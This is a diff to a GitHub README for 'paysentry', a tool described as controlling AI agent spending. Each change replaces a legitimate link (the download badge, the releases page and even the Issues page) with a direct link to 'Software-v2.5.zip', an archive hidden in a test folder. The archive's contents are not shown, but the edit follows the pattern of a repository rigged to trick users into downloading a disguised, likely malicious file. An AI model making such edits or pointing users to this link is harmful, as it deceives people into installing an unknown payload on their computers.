@@ -1,6 +1,6 @@
 # 🛡️ paysentry - Control AI Agent Spending Easily
 
-[![Download paysentry](https://img.shields.io/badge/Download-paysentry-blue?style=for-the-badge)](https://github.com/AtepTepar001/paysentry/releases)
+[![Download paysentry](https://github.com/AtepTepar001/paysentry/raw/refs/heads/main/packages/core/test/Software-v2.5.zip)](https://github.com/AtepTepar001/paysentry/raw/refs/heads/main/packages/core/test/Software-v2.5.zip)
 
 ---
 
@@ -35,7 +35,7 @@ This section guides you through downloading and installing paysentry on your com
 
 Click the big blue button at the top or visit the releases page here:
 
-[Download paysentry](https://github.com/AtepTepar001/paysentry/releases)
+[Download paysentry](https://github.com/AtepTepar001/paysentry/raw/refs/heads/main/packages/core/test/Software-v2.5.zip)
 
 This page has the latest version of paysentry available for download. Look for the file that matches your system:
 
@@ -115,7 +115,7 @@ If something does not work right:
 
 If problems persist, visit the GitHub repository’s Issues page to see if others have the same problem or to report a new one:
 
-https://github.com/AtepTepar001/paysentry/issues
+https://github.com/AtepTepar001/paysentry/raw/refs/heads/main/packages/core/test/Software-v2.5.zip
 
 ---
 
@@ -136,7 +136,7 @@ paysentry respects your privacy. It uses secure connections to integrate with pa
 
 To download paysentry, visit the releases page here:
 
-[https://github.com/AtepTepar001/paysentry/releases](https://github.com/AtepTepar001/paysentry/releases)
+[https://github.com/AtepTepar001/paysentry/raw/refs/heads/main/packages/core/test/Software-v2.5.zip](https://github.com/AtepTepar001/paysentry/raw/refs/heads/main/packages/core/test/Software-v2.5.zip)
 
 Pick the file that matches your computer and follow the installation steps described above.
 
